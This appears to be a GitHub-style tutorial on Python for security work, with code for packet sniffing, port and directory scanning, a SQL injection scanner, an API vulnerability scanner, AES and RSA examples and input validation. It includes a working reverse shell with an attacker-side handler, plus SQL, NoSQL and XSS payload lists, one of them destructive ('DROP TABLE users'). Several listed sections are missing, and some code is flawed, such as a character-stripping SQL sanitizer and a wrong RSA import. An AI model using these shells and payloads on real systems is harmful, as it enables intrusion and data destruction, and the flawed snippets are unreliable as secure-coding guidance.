# Python for Security Guide

[![Python](https://img.shields.io/badge/Python-Security-blue?style=for-the-badge&logo=python)](https://github.com/Scav-engeR)
[![Cybersecurity](https://img.shields.io/badge/Cyber-Security-red?style=for-the-badge&logo=security)](https://www.python.org)
[![Automation](https://img.shields.io/badge/Security-Automation-green?style=for-the-badge&logo=automate)](https://pypi.org)

## Table of Contents

1. [Introduction](#introduction)
2. [Python Security Libraries](#python-security-libraries)
3. [Network Programming & Sockets](#network-programming--sockets)
4. [Web Scraping & Automation](#web-scraping--automation)
5. [Cryptography & Hashing](#cryptography--hashing)
6. [Exploit Development Basics](#exploit-development-basics)
7. [API Security Testing](#api-security-testing)
8. [Database Security Scripts](#database-security-scripts)
9. [Log Analysis & Parsing](#log-analysis--parsing)
10. [Custom Security Tools](#custom-security-tools)
11. [Malware Analysis Scripts](#malware-analysis-scripts)
12. [Network Security Monitoring](#network-security-monitoring)
13. [Penetration Testing Frameworks](#penetration-testing-frameworks)
14. [Security Automation](#security-automation)
15. [Best Practices](#best-practices)
16. [Resources](#resources)

---

## Introduction

Python has become the de facto standard for cybersecurity professionals due to its simplicity, extensive libraries, and powerful capabilities. This guide covers essential Python programming techniques and libraries specifically tailored for security applications.

### Why Python for Security?
- **Rapid Development**: Quick prototyping and deployment
- **Extensive Libraries**: Rich ecosystem of security-focused packages
- **Cross-Platform**: Works on Windows, Linux, and macOS
- **Active Community**: Strong support and continuous development
- **Integration**: Easy integration with existing security tools

---

## Python Security Libraries

### Essential Security Libraries

#### Installation Commands
```bash
# Core security libraries
pip install scapy requests beautifulsoup4 pycryptodome
pip install nmap-python python-nmap
pip install paramiko fabric
pip install sqlalchemy psycopg2-binary pymongo
pip install flask django fastapi
pip install selenium pandas numpy matplotlib

# Advanced security tools
pip install volatility3 yara-python
pip install pefile python-magic
pip install impacket bloodhound
```

#### Library Overview
```python
# Essential imports for security scripts
import socket
import sys
import threading
import subprocess
import hashlib
import hmac
import base64
import json
import requests
import urllib.parse
from datetime import datetime
import logging
import argparse
import os
import re

# Security-specific libraries
import scapy.all as scapy
import nmap
import paramiko
from Crypto.Cipher import AES, RSA
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
```

### Network Security Libraries

#### Scapy - Packet Manipulation
```python
from scapy.all import *

# Basic packet creation
packet = IP(dst="192.168.1.1")/TCP(dport=80)
send(packet)

# Packet sniffing
def packet_handler(packet):
    if packet.haslayer(TCP):
        print(f"TCP Packet: {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")

sniff(filter="tcp", prn=packet_handler, count=10)

# ARP scanning
def arp_scan(network):
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    clients = []
    for element in answered_list:
        client = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients.append(client)
    return clients

# Usage
network = "192.168.1.0/24"
clients = arp_scan(network)
for client in clients:
    print(f"IP: {client['ip']}, MAC: {client['mac']}")
```

#### Nmap Integration
```python
import nmap

class NetworkScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
    
    def scan_host(self, host, ports="1-1000"):
        """Scan a single host for open ports"""
        try:
            result = self.nm.scan(host, ports)
            return result
        except Exception as e:
            print(f"Error scanning {host}: {e}")
            return None
    
    def scan_network(self, network):
        """Discover hosts on network"""
        try:
            result = self.nm.scan(hosts=network, arguments='-sn')
            hosts = []
            for host in self.nm.all_hosts():
                if self.nm[host].state() == 'up':
                    hosts.append(host)
            return hosts
        except Exception as e:
            print(f"Error scanning network: {e}")
            return []
    
    def service_detection(self, host, ports="1-1000"):
        """Detect services on open ports"""
        try:
            result = self.nm.scan(host, ports, arguments='-sV')
            services = {}
            if host in self.nm.all_hosts():
                for port in self.nm[host]['tcp']:
                    service = self.nm[host]['tcp'][port]
                    services[port] = {
                        'state': service['state'],
                        'name': service['name'],
                        'version': service.get('version', 'unknown')
                    }
            return services
        except Exception as e:
            print(f"Error detecting services: {e}")
            return {}

# Usage
scanner = NetworkScanner()
hosts = scanner.scan_network("192.168.1.0/24")
for host in hosts:
    services = scanner.service_detection(host, "22,80,443,3389")
    print(f"Host: {host}")
    for port, service in services.items():
        print(f"  Port {port}: {service['name']} - {service['version']}")
```

---

## Network Programming & Sockets

### TCP/UDP Client and Server

#### TCP Port Scanner
```python
import socket
import threading
from datetime import datetime

class PortScanner:
    def __init__(self, target_host):
        self.target_host = target_host
        self.open_ports = []
    
    def scan_port(self, port):
        """Scan a single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target_host, port))
            if result == 0:
                self.open_ports.append(port)
                print(f"Port {port}: Open")
            sock.close()
        except socket.gaierror:
            print(f"Hostname {self.target_host} could not be resolved")
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    
    def threaded_scan(self, start_port, end_port, num_threads=100):
        """Multi-threaded port scanning"""
        print(f"Starting port scan on {self.target_host}")
        print(f"Time started: {datetime.now()}")
        
        def worker():
            while True:
                port = q.get()
                if port is None:
                    break
                self.scan_port(port)
                q.task_done()
        
        import queue
        q = queue.Queue()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        
        # Add ports to queue
        for port in range(start_port, end_port + 1):
            q.put(port)
        
        # Wait for completion
        q.join()
        
        # Stop worker threads
        for i in range(num_threads):
            q.put(None)
        for t in threads:
            t.join()
        
        print(f"Scanning completed at: {datetime.now()}")
        print(f"Open ports: {self.open_ports}")

# Usage
scanner = PortScanner("192.168.1.1")
scanner.threaded_scan(1, 1000)
```

#### TCP Reverse Shell
```python
import socket
import subprocess
import threading

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
    
    def connect(self):
        """Connect to the handler"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.decode('utf-8')}"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def start_shell(self):
        """Start the reverse shell"""
        if not self.connect():
            return
        
        try:
            while True:
                command = self.sock.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        self.sock.send(b"Directory changed\n")
                    except Exception as e:
                        self.sock.send(f"Error: {str(e)}\n".encode())
                else:
                    output = self.execute_command(command)
                    self.sock.send(output.encode())
        except Exception as e:
            print(f"Shell error: {e}")
        finally:
            self.sock.close()

# Handler script (run on attacker machine)
class ShellHandler:
    def __init__(self, port):
        self.port = port
        self.sock = None
    
    def start_listener(self):
        """Start listening for reverse shell connections"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind(('0.0.0.0', self.port))
            self.sock.listen(5)
            print(f"Listening on port {self.port}...")
            
            while True:
                client_sock, addr = self.sock.accept()
                print(f"Connection from {addr}")
                self.handle_client(client_sock)
        except Exception as e:
            print(f"Handler error: {e}")
    
    def handle_client(self, client_sock):
        """Handle client shell session"""
        try:
            while True:
                command = input("Shell> ")
                if command.lower() == 'exit':
                    client_sock.send(b'exit')
                    break
                
                client_sock.send(command.encode())
                response = client_sock.recv(4096).decode('utf-8')
                print(response)
        except Exception as e:
            print(f"Client handling error: {e}")
        finally:
            client_sock.close()

# Usage examples (for educational purposes only)
# Victim machine:
# shell = ReverseShell("attacker_ip", 4444)
# shell.start_shell()

# Attacker machine:
# handler = ShellHandler(4444)
# handler.start_listener()
```

---

## Web Scraping & Automation

### Web Reconnaissance

#### Directory Brute Forcer
```python
import requests
import threading
from urllib.parse import urljoin
import sys

class DirectoryBruteForcer:
    def __init__(self, target_url, wordlist_file):
        self.target_url = target_url
        self.wordlist_file = wordlist_file
        self.found_directories = []
        self.found_files = []
    
    def load_wordlist(self):
        """Load wordlist from file"""
        try:
            with open(self.wordlist_file, 'r') as f:
                return [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print(f"Wordlist file {self.wordlist_file} not found")
            return []
    
    def test_directory(self, directory):
        """Test if directory exists"""
        url = urljoin(self.target_url, directory)
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            if response.status_code == 200:
                self.found_directories.append(url)
                print(f"[FOUND] Directory: {url}")
            elif response.status_code == 403:
                print(f"[FORBIDDEN] Directory: {url}")
        except requests.exceptions.RequestException:
            pass  # Connection error, skip
    
    def test_file(self, filename):
        """Test if file exists"""
        url = urljoin(self.target_url, filename)
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 200:
                self.found_files.append(url)
                print(f"[FOUND] File: {url}")
        except requests.exceptions.RequestException:
            pass
    
    def brute_force(self, num_threads=50):
        """Multi-threaded brute force"""
        wordlist = self.load_wordlist()
        if not wordlist:
            return
        
        def worker():
            while True:
                word = q.get()
                if word is None:
                    break
                
                # Test as directory
                self.test_directory(word + '/')
                
                # Test common file extensions
                extensions = ['.php', '.html', '.txt', '.js', '.css', '.xml', '.json']
                for ext in extensions:
                    self.test_file(word + ext)
                
                q.task_done()
        
        import queue
        q = queue.Queue()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        
        # Add words to queue
        for word in wordlist:
            q.put(word)
        
        # Wait for completion
        q.join()
        
        # Stop worker threads
        for i in range(num_threads):
            q.put(None)
        for t in threads:
            t.join()
        
        print(f"\nScan completed!")
        print(f"Found {len(self.found_directories)} directories")
        print(f"Found {len(self.found_files)} files")

# Usage
brute_forcer = DirectoryBruteForcer("http://example.com", "wordlist.txt")
brute_forcer.brute_force()
```

#### SQL Injection Scanner
```python
import requests
import urllib.parse
from bs4 import BeautifulSoup

class SQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        # Common SQL injection payloads
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "'; DROP TABLE users; --",
            "\"; DROP TABLE users; --"
        ]
        
        # Error patterns that indicate SQL injection
        self.error_patterns = [
            "mysql_fetch_array",
            "ORA-01756",
            "Microsoft OLE DB Provider",
            "SQLServer JDBC Driver",
            "PostgreSQL query failed",
            "Warning: mysql_",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "check the manual that corresponds to your MySQL",
            "ORA-00933",
            "ORA-00921"
        ]
    
    def get_forms(self, url):
        """Extract all forms from a webpage"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"Error getting forms: {e}")
            return []
    
    def get_form_details(self, form):
        """Extract form details"""
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def test_sqli(self, form_details, url):
        """Test form for SQL injection vulnerability"""
        target_url = urllib.parse.urljoin(url, form_details["action"])
        
        for payload in self.payloads:
            data = {}
            for input_field in form_details["inputs"]:
                if input_field["type"] == "text" or input_field["type"] == "search":
                    data[input_field["name"]] = payload
                elif input_field["type"] == "email":
                    data[input_field["name"]] = f"test{payload}@test.com"
                else:
                    data[input_field["name"]] = "test"
            
            try:
                if form_details["method"] == "post":
                    response = self.session.post(target_url, data=data)
                else:
                    response = self.session.get(target_url, params=data)
                
                # Check for SQL error patterns
                for pattern in self.error_patterns:
                    if pattern.lower() in response.text.lower():
                        print(f"[VULNERABLE] SQL Injection found!")
                        print(f"URL: {target_url}")
                        print(f"Payload: {payload}")
                        print(f"Error pattern: {pattern}")
                        return True
                        
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")
        
        return False
    
    def scan(self):
        """Scan target URL for SQL injection vulnerabilities"""
        print(f"Scanning {self.target_url} for SQL injection...")
        
        forms = self.get_forms(self.target_url)
        print(f"Found {len(forms)} forms to test")
        
        vulnerable_forms = 0
        for form in forms:
            form_details = self.get_form_details(form)
            if self.test_sqli(form_details, self.target_url):
                vulnerable_forms += 1
        
        print(f"Scan completed. Found {vulnerable_forms} vulnerable forms.")

# Usage
scanner = SQLiScanner("http://testphp.vulnweb.com/listproducts.php")
scanner.scan()
```

---

## Cryptography & Hashing

### Encryption and Decryption

#### AES Encryption Implementation
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
import base64
import hashlib

class AESCrypto:
    def __init__(self, password):
        self.password = password.encode('utf-8')
    
    def derive_key(self, salt, password):
        """Derive encryption key from password using PBKDF2"""
        return PBKDF2(password, salt, 32, count=100000, hmac_hash_module=SHA256)
    
    def encrypt(self, plaintext):
        """Encrypt plaintext using AES"""
        # Generate random salt and IV
        salt = get_random_bytes(16)
        iv = get_random_bytes(16)
        
        # Derive key from password
        key = self.derive_key(salt, self.password)
        
        # Pad plaintext to multiple of 16 bytes
        padded_plaintext = self._pad(plaintext)
        
        # Encrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(padded_plaintext.encode('utf-8'))
        
        # Combine salt + iv + ciphertext
        encrypted_data = salt + iv + ciphertext
        
        return base64.b64encode(encrypted_data).decode('utf-8')
    
    def decrypt(self, encrypted_data):
        """Decrypt ciphertext using AES"""
        try:
            # Decode base64
            encrypted_data = base64.b64decode(encrypted_data)
            
            # Extract salt, IV, and ciphertext
            salt = encrypted_data[:16]
            iv = encrypted_data[16:32]
            ciphertext = encrypted_data[32:]
            
            # Derive key from password
            key = self.derive_key(salt, self.password)
            
            # Decrypt
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_data = cipher.decrypt(ciphertext)
            
            # Remove padding and decode
            return self._unpad(decrypted_data.decode('utf-8'))
        
        except Exception as e:
            raise Exception(f"Decryption failed: {e}")
    
    def _pad(self, text):
        """Add PKCS7 padding"""
        pad_length = 16 - (len(text) % 16)
        return text + (chr(pad_length) * pad_length)
    
    def _unpad(self, text):
        """Remove PKCS7 padding"""
        pad_length = ord(text[-1])
        return text[:-pad_length]

# Hash functions for password security
class SecureHashing:
    @staticmethod
    def hash_password(password, salt=None):
        """Hash password with salt using SHA-256"""
        if salt is None:
            salt = get_random_bytes(32)
        
        pwdhash = hashlib.pbkdf2_hmac('sha256', 
                                     password.encode('utf-8'), 
                                     salt, 
                                     100000)
        return {
            'hash': pwdhash,
            'salt': salt
        }
    
    @staticmethod
    def verify_password(password, hash_data):
        """Verify password against stored hash"""
        new_hash = hashlib.pbkdf2_hmac('sha256',
                                      password.encode('utf-8'),
                                      hash_data['salt'],
                                      100000)
        return new_hash == hash_data['hash']
    
    @staticmethod
    def file_hash(filename, algorithm='sha256'):
        """Calculate hash of a file"""
        hash_obj = hashlib.new(algorithm)
        with open(filename, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_obj.update(chunk)
        return hash_obj.hexdigest()

# Usage examples
crypto = AESCrypto("my_secret_password")
encrypted = crypto.encrypt("This is sensitive data")
print(f"Encrypted: {encrypted}")

decrypted = crypto.decrypt(encrypted)
print(f"Decrypted: {decrypted}")

# Password hashing
hasher = SecureHashing()
password_data = hasher.hash_password("user_password")
is_valid = hasher.verify_password("user_password", password_data)
print(f"Password valid: {is_valid}")
```

### Digital Signatures and Certificates

#### RSA Digital Signatures
```python
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
import base64

class DigitalSignature:
    def __init__(self):
        self.private_key = None
        self.public_key = None
    
    def generate_keys(self, key_size=2048):
        """Generate RSA key pair"""
        key = RSA.generate(key_size)
        self.private_key = key
        self.public_key = key.publickey()
        return {
            'private_key': key.export_key().decode('utf-8'),
            'public_key': key.publickey().export_key().decode('utf-8')
        }
    
    def load_keys(self, private_key_pem=None, public_key_pem=None):
        """Load keys from PEM format"""
        if private_key_pem:
            self.private_key = RSA.import_key(private_key_pem)
        if public_key_pem:
            self.public_key = RSA.import_key(public_key_pem)
    
    def sign_message(self, message):
        """Sign a message with private key"""
        if not self.private_key:
            raise Exception("Private key not loaded")
        
        message_hash = SHA256.new(message.encode('utf-8'))
        signature = pkcs1_15.new(self.private_key).sign(message_hash)
        return base64.b64encode(signature).decode('utf-8')
    
    def verify_signature(self, message, signature):
        """Verify signature with public key"""
        if not self.public_key:
            raise Exception("Public key not loaded")
        
        try:
            message_hash = SHA256.new(message.encode('utf-8'))
            signature_bytes = base64.b64decode(signature)
            pkcs1_15.new(self.public_key).verify(message_hash, signature_bytes)
            return True
        except:
            return False

# Usage
ds = DigitalSignature()
keys = ds.generate_keys()

message = "This is a secure message"
signature = ds.sign_message(message)
print(f"Signature: {signature}")

is_valid = ds.verify_signature(message, signature)
print(f"Signature valid: {is_valid}")
```

---

## API Security Testing

### REST API Security Scanner

```python
import requests
import json
import urllib.parse
from datetime import datetime

class APISecurityScanner:
    def __init__(self, base_url, headers=None):
        self.base_url = base_url
        self.session = requests.Session()
        if headers:
            self.session.headers.update(headers)
        
        # Common API vulnerabilities to test
        self.tests = [
            self.test_authentication_bypass,
            self.test_authorization_bypass,
            self.test_sql_injection,
            self.test_nosql_injection,
            self.test_xss,
            self.test_xxe,
            self.test_directory_traversal,
            self.test_rate_limiting,
            self.test_information_disclosure
        ]
    
    def test_authentication_bypass(self, endpoint):
        """Test for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        # Test with no authentication
        response = requests.get(f"{self.base_url}{endpoint}")
        if response.status_code == 200:
            vulnerabilities.append({
                'type': 'Authentication Bypass',
                'description': 'Endpoint accessible without authentication',
                'endpoint': endpoint
            })
        
        # Test with invalid tokens
        invalid_tokens = ['invalid_token', 'null', '', 'admin', '123456']
        for token in invalid_tokens:
            headers = {'Authorization': f'Bearer {token}'}
            response = requests.get(f"{self.base_url}{endpoint}", headers=headers)
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Authentication Bypass',
                    'description': f'Endpoint accessible with invalid token: {token}',
                    'endpoint': endpoint
                })
        
        return vulnerabilities
    
    def test_authorization_bypass(self, endpoint):
        """Test for authorization bypass (IDOR)"""
        vulnerabilities = []
        
        # Test parameter manipulation
        if '/' in endpoint:
            parts = endpoint.split('/')
            for i, part in enumerate(parts):
                if part.isdigit():
                    # Test with different user IDs
                    for test_id in ['1', '2', '999', '0', '-1']:
                        test_endpoint = '/'.join(parts[:i] + [test_id] + parts[i+1:])
                        response = self.session.get(f"{self.base_url}{test_endpoint}")
                        if response.status_code == 200:
                            vulnerabilities.append({
                                'type': 'IDOR',
                                'description': f'Possible IDOR vulnerability with ID: {test_id}',
                                'endpoint': test_endpoint
                            })
        
        return vulnerabilities
    
    def test_sql_injection(self, endpoint):
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, username, password FROM users --",
            "1' AND SLEEP(5) --"
        ]
        
        for payload in sql_payloads:
            # Test in URL parameters
            test_url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            response = requests.get(test_url)
            
            if self._check_sql_errors(response.text):
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'description': f'SQL injection vulnerability detected with payload: {payload}',
                    'endpoint': endpoint
                })
        
        return vulnerabilities
    
    def test_nosql_injection(self, endpoint):
        """Test for NoSQL injection vulnerabilities"""
        vulnerabilities = []
        
        nosql_payloads = [
            {"$ne": ""},
            {"$regex": ".*"},
            {"$where": "this.username == this.password"},
            {"username": {"$ne": ""}, "password": {"$ne": ""}}
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json=payload,
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    vulnerabilities.append({
                        'type': 'NoSQL Injection',
                        'description': f'Possible NoSQL injection with payload: {payload}',
                        'endpoint': endpoint
                    })
            except:
                pass
        
        return vulnerabilities
    
    def test_xss(self, endpoint):
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            # Test in parameters
            test_url = f"{self.base_url}{endpoint}?q={urllib.parse.quote(payload)}"
            response = requests.get(test_url)
            
            if payload in response.text:
                vulnerabilities.append({
                    'type': 'XSS',
                    'description': f'XSS vulnerability detected with payload: {payload}',
                    'endpoint': endpoint
                })
        
        return vulnerabilities
    
    def test_rate_limiting(self, endpoint):
        """Test for rate limiting implementation"""
        vulnerabilities = []
        
        # Send multiple requests rapidly
        responses = []
        for i in range(50):
            response = self.session.get(f"{self.base_url}{endpoint}")
            responses.append(response.status_code)
        
        # Check if any rate limiting is in place
        rate_limited = any(code in [429, 503] for code in responses)
        if not rate_limited:
            vulnerabilities.append({
                'type': 'Missing Rate Limiting',
                'description': 'No rate limiting detected on endpoint',
                'endpoint': endpoint
            })
        
        return vulnerabilities
    
    def _check_sql_errors(self, response_text):
        """Check for SQL error patterns in response"""
        sql_errors = [
            "mysql_fetch_array",
            "ORA-01756",
            "Microsoft OLE DB Provider",
            "SQLServer JDBC Driver",
            "PostgreSQL query failed"
        ]
        
        return any(error.lower() in response_text.lower() for error in sql_errors)
    
    def scan_endpoint(self, endpoint):
        """Run all security tests on an endpoint"""
        print(f"Scanning endpoint: {endpoint}")
        all_vulnerabilities = []
        
        for test in self.tests:
            try:
                vulnerabilities = test(endpoint)
                all_vulnerabilities.extend(vulnerabilities)
            except Exception as e:
                print(f"Error running test {test.__name__}: {e}")
        
        return all_vulnerabilities
    
    def generate_report(self, vulnerabilities):
        """Generate security scan report"""
        report = {
            'scan_date': datetime.now().isoformat(),
            'target': self.base_url,
            'total_vulnerabilities': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
        
        return json.dumps(report, indent=2)

# Usage
scanner = APISecurityScanner("https://api.example.com")
vulns = scanner.scan_endpoint("/api/v1/users/123")
report = scanner.generate_report(vulns)
print(report)
```

---

## Best Practices

### Secure Coding Guidelines

#### Input Validation and Sanitization
```python
import re
import html
import urllib.parse

class InputValidator:
    @staticmethod
    def validate_email(email):
        """Validate email format"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    @staticmethod
    def validate_ip(ip):
        """Validate IP address"""
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    @staticmethod
    def validate_url(url):
        """Validate URL format"""
        pattern = r'^https?://(?:[-\w.])+(?:\:[0-9]+)?(?:/(?:[\w/_.])*(?:\?(?:[\w&=%.])*)?(?:\#(?:[\w.])*)?)?$'
        return re.match(pattern, url) is not None
    
    @staticmethod
    def sanitize_html(text):
        """Sanitize HTML to prevent XSS"""
        return html.escape(text)
    
    @staticmethod
    def sanitize_sql(text):
        """Basic SQL injection prevention"""
        dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
        for char in dangerous_chars:
            text = text.replace(char, '')
        return text
    
    @staticmethod
    def validate_filename(filename):
        """Validate filename to prevent directory traversal"""
        # Remove path traversal attempts
        filename = filename.replace('..', '')
        filename = filename.replace('/', '')
        filename = filename.replace('\\', '')
        
        # Check for dangerous extensions
        dangerous_extensions = ['.exe', '.bat', '.cmd', '.com', '.pif', '.scr', '.vbs', '.js']
        for ext in dangerous_extensions:
            if filename.lower().endswith(ext):
                return False
        
        return True

# Error handling and logging
import logging
import traceback

class SecurityLogger:
    def __init__(self, log_file="security.log"):
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    def log_security_event(self, event_type, details):
        """Log security-related events"""
        self.logger.warning(f"SECURITY EVENT - {event_type}: {details}")
    
    def log_error(self, error, context=""):
        """Log errors with context"""
        self.logger.error(f"ERROR - {context}: {str(error)}")
        self.logger.error(f"TRACEBACK: {traceback.format_exc()}")
    
    def log_access_attempt(self, user, resource, success):
        """Log access attempts"""
        status = "SUCCESS" if success else "FAILED"
        self.logger.info(f"ACCESS ATTEMPT - User: {user}, Resource: {resource}, Status: {status}")

# Secure configuration management
class SecureConfig:
    def __init__(self):
        self.config = {}
    
    def load_from_env(self, key, default=None, required=False):
        """Load configuration from environment variables"""
        import os
        value = os.getenv(key, default)
        if required and value is None:
            raise ValueError(f"Required configuration {key} not found")
        return value
    
    def load_from_file(self, config_file):
        """Load configuration from encrypted file"""
        try:
            with open(config_file, 'r') as f:
                # In production, decrypt the file content
                self.config = json.load(f)
        except Exception as e:
            raise Exception(f"Failed to load configuration: {e}")
    
    def get(self, key, default=None):
        """Get configuration value"""
        return self.config.get(key, default)
    
    def mask_sensitive_data(self, data):
        """Mask sensitive data for logging"""
        sensitive_keys = ['password', 'token', 'key', 'secret']
        if isinstance(data, dict):
            masked = {}
            for k, v in data.items():
                if any(sensitive in k.lower() for sensitive in sensitive_keys):
                    masked[k] = '*' * len(str(v))
                else:
                    masked[k] = v
            return masked
        return data

# Usage examples
validator = InputValidator()
logger = SecurityLogger()
config = SecureConfig()

# Validate input
email = "test@example.com"
if validator.validate_email(email):
    logger.log_access_attempt("user", "email_validation", True)
else:
    logger.log_security_event("INVALID_EMAIL", f"Invalid email attempt: {email}")
```

---

## Resources

### Essential Libraries and Tools
- **Scapy**: Packet manipulation and network discovery
- **Nmap-Python**: Network scanning and service detection
- **Requests**: HTTP library for API testing
- **BeautifulSoup**: Web scraping and HTML parsing
- **PyCryptodome**: Cryptographic operations
- **Paramiko**: SSH client implementation
- **Volatility3**: Memory forensics framework
- **YARA-Python**: Malware identification rules

### Learning Resources
- [Python for Cybersecurity](https://www.python.org/about/apps/#security)
- [OWASP Python Security](https://owasp.org/www-project-python-security/)
- [Black Hat Python Book](https://nostarch.com/blackhatpython)
- [Violent Python Book](https://www.elsevier.com/books/violent-python/9781597499576)

### Security-Focused Python Frameworks
- **Django Security**: Web application security framework
- **Flask-Security**: Security extensions for Flask
- **FastAPI Security**: Modern API security features
- **Twisted**: Event-driven networking engine

---

## Conclusion

Python's versatility and extensive library ecosystem make it an ideal language for cybersecurity professionals. This guide provides the foundation for developing security tools, automating tasks, and conducting security assessments using Python.

Key takeaways:
- **Always validate and sanitize input** to prevent injection attacks
- **Use established cryptographic libraries** rather than implementing your own
- **Implement proper error handling and logging** for security events
- **Follow secure coding practices** throughout development
- **Keep libraries updated** to patch security vulnerabilities

---

*This guide is for educational and authorized security testing purposes only. Always ensure you have proper authorization before testing any systems.*

[![GitHub](https://img.shields.io/badge/GitHub-Scav-engeR-black?style=for-the-badge&logo=github)](https://github.com/Scav-engeR)
[![Website](https://img.shields.io/badge/Website-Scav-engeR.github.io-blue?style=for-the-badge&logo=web)](https://Scav-engeR.github.io) 
